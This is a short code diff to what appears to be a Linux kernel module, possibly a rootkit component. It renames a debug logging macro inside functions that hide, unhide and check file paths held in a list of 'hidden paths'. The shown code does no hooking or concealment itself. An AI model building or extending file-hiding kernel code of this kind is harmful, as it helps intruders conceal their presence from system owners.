@@ -61,7 +61,7 @@ bool cmd_hide(char *arg, uint64_t len) {
   struct hidden_path *hp = NULL, *trav = NULL;
 
   if (NULL == (hp = kmalloc(sizeof(struct hidden_path), GFP_KERNEL))) {
-    debgf("failed to allocate space for the new hidden path (%s)", arg);
+    debg("failed to allocate space for the new hidden path (%s)", arg);
     return false;
   }
 
@@ -69,11 +69,11 @@ bool cmd_hide(char *arg, uint64_t len) {
 
   // fails if the path does not exist
   if (kern_path(arg, LOOKUP_FOLLOW, &hp->path) != 0) {
-    debgf("failed to obtain the path from %s", arg);
+    debg("failed to obtain the path from %s", arg);
     return false;
   }
 
-  debgf("hiding path: %s", arg);
+  debg("hiding path: %s", arg);
 
   if (NULL == (trav = hst.head)) {
     hst.head = hp;
@@ -95,11 +95,11 @@ bool cmd_unhide(char *arg, uint64_t len) {
   struct path         path;
 
   if (kern_path(arg, LOOKUP_FOLLOW, &path) != 0) {
-    debgf("failed to obtain the path from %s", arg);
+    debg("failed to obtain the path from %s", arg);
     return false;
   }
 
-  debgf("unhiding path: %s", arg);
+  debg("unhiding path: %s", arg);
 
   while (trav != NULL) {
     if (is_same_path(&trav->path, &path))
@@ -128,11 +128,11 @@ bool cmd_check(char *arg, uint64_t len) {
   struct path         path;
 
   if (kern_path(arg, LOOKUP_FOLLOW, &path) != 0) {
-    debgf("failed to obtain the path from %s", arg);
+    debg("failed to obtain the path from %s", arg);
     return false;
   }
 
-  debgf("checking path: %s", arg);
+  debg("checking path: %s", arg);
 
   for (; trav != NULL; trav = trav->next)
     if (is_same_path(&trav->path, &path))
